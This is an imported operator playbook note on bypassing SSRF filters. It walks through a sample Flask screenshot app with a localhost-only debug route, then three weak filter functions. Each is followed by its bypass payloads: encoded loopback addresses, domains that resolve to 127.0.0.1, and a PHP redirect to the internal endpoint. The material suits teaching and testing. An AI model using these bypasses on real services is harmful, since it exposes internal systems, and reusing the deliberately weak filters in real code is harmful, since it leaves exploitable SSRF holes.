---
technique: "SSRF Basic Filter Bypasses"
family: "ssrf-xxe-file"
severity_hint: "high"
tags: []
source: "_raw/Web attacks/Web Attacks/DNS Rebinding/SSRF Basic Filter Bypasses.md"
source_sha256: "c444a1baf8e8e4c10391d610635e0df0d03f7f9ae600ee9970c35ce1045e5ffa"
curator_version: 2
review_status: imported-unreviewed
---

# SSRF Basic Filter Bypasses

> Family: **ssrf-xxe-file** · Severity hint: **high** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `bash: @app.route('/', methods=['GET', 'POST'])`
- `bash: def take_screenshot(url, filename=f'./screen_{os.urandom(8).hex()}.png'):`
- `python: def check_domain(domain):`
- `bash: Localhost Address Block: 127.0.0.0 - 127.255.255.255`
- `python: def check_domain(domain):`
- `bash: nslookup localtest.me`
- `python: def check_domain(domain):`
- `python: php -S 0.0.0.0:80`
- `python: <?php header('Location: http://127.0.0.1/debug'); ?>`

## Playbook (operator notes)

# SSRF Basic Filter Bypasses

# Server-Side-Request-Forgery (SSRF)

- Occour when an attack can coerce the server to fetch remote resources using HTTP requests; this might allow an attacker to identify and enumerate services running on the local network of the web server, which an external attacker would generally be unable to access due to a firewall blocking access

# **Confirming SSRF**

- Example
    
    
    
    ```bash
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'GET':
            return render_template('index.html')
       
        try:
            screenshot = screenshot_url(request.form.get('url'))
        except Exception as e:
            return f'Error: {e}', 400
    
        # b64 encode image
        image = Image.open(screenshot)
        buffered = BytesIO()
        image.save(buffered, format="PNG")
        img_data = base64.b64encode(buffered.getvalue())
    
        return render_template('index.html', screenshot=img_data.decode('utf-8'))
    
    @app.route('/debug')
    def debug():
        if request.remote_addr != '127.0.0.1':
                return 'Unauthorized!', 401
        return render_template('debug.html')
    ```
    
    - We need to bypass `/debug` but our IP is checked
    
    ```bash
    def take_screenshot(url, filename=f'./screen_{os.urandom(8).hex()}.png'):
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(url)
        driver.save_screenshot(filename)
        driver.quit()
    
        return filename
    
    def screenshot_url(url):
        scheme = urlparse(url).scheme
        domain = urlparse(url).hostname
    
        if not domain or not scheme:
            raise Exception('Malformed URL')
            
        if scheme not in ['http', 'https']:
            raise Exception('Invalid scheme')
        
        return take_screenshot(url)
    ```
    
    # **Exploitation**
    
    - App only restricts us to use `http(s)` but not the domain or IP we can provide
    - We can simply use `/debug` where the IP is then coming from localhost

# **SSRF Basic Filter Bypasses**

- Obfuscation of localhost
    - Assuming the example was “improved” with the function `check_domain`
    
    ```python
    def check_domain(domain):
        if 'localhost' in domain:
            return False
        
        if domain == '127.0.0.1':
            return False
    
        return True
    ```
    
    ```bash
    Localhost Address Block: 127.0.0.0 - 127.255.255.255
    Shortened IP Address: 127.1
    Prolonged IP Address: 127.000000000000000.1
    All Zeroes: 0.0.0.0
    Shortened All Zeroes: 0
    Decimal Representation: 2130706433
    Octal Representation: 0177.0000.0000.0001
    Hex Representation: 0x7f000001
    IPv6 loopback address: 0:0:0:0:0:0:0:1 (also ::1)
    IPv4-mapped IPv6 loopback address: ::ffff:127.0.0.1
    ```
    
- Bypass via DNS Resolution
    
    ```python
    def check_domain(domain):
        if 'localhost' in domain:
            return False
    
        try:
            # parse IP
            ip = ipaddress.ip_address(domain)
    
            # check internal IP address space
            if ip in ipaddress.ip_network('127.0.0.0/8'):
                return False
            if ip in ipaddress.ip_network('10.0.0.0/8'):
                return False
            if ip in ipaddress.ip_network('172.16.0.0/12'):
                return False
            if ip in ipaddress.ip_network('192.168.0.0/16'):
                return False
            if ip in ipaddress.ip_network('0.0.0.0/8'):
                return False
        except:
            pass
    
        return True
    ```
    
    - Register a domain and point it to any internal IP or use existing ones
    
    ```bash
    nslookup localtest.me
    
    Server:		1.1.1.1
    Address:	1.1.1.1#53
    
    Non-authoritative answer:
    Name:	localtest.me
    Address: 127.0.0.1
    Name:	localtest.me
    Address: ::1
    ```
    
- Bypass via HTTP Redirect
    
    ```python
    def check_domain(domain):
        try:
            # resolve domain
            ip = socket.gethostbyname(domain)
    
            # parse IP
            ip = ipaddress.ip_address(ip)
    
            # check internal IP address space
            if ip in ipaddress.ip_network('127.0.0.0/8'):
                return False
            if ip in ipaddress.ip_network('10.0.0.0/8'):
                return False
            if ip in ipaddress.ip_network('172.16.0.0/12'):
                return False
            if ip in ipaddress.ip_network('192.168.0.0/16'):
                return False
            if ip in ipaddress.ip_network('0.0.0.0/8'):
                return False
    
            return True
        except:
            pass
    
        return False
    ```
    
    - We can bypass the filter by providing a URL pointing to a web server under our control, redirecting the web application to the local debug endpoint
    
    ```python
    php -S 0.0.0.0:80
    ```
    
    ```python
    <?php header('Location: http://127.0.0.1/debug'); ?>
    ```

## Source
Original note: `_raw/Web attacks/Web Attacks/DNS Rebinding/SSRF Basic Filter Bypasses.md`
